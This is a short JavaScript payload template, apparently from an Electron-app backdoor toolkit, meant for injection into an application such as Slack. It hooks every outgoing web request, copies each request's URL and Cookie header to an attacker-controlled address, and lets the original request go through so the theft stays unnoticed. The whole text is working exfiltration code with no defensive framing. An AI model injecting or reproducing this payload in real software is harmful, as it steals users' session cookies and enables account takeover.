webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
    %BEEMKA_VARIABLE_PLACEHOLDER%

    // Prevent infinite loop.
    if (details.url.indexOf(beemka_slack_url) > -1) {
        callback(details)
        return
    }

    const { net } = require('electron')
    const request = net.request(beemka_slack_url + '?' + beemka_slack_url_param + '=' + encodeURIComponent(details.url) + '&' + beemka_slack_data_param + '=' + encodeURIComponent(details.requestHeaders.Cookie))

    request.on('response', (response) => {
        response.on('data', (chunk) => {})
        response.on('end', () => {})
    })
    request.end()
    callback(details)
})
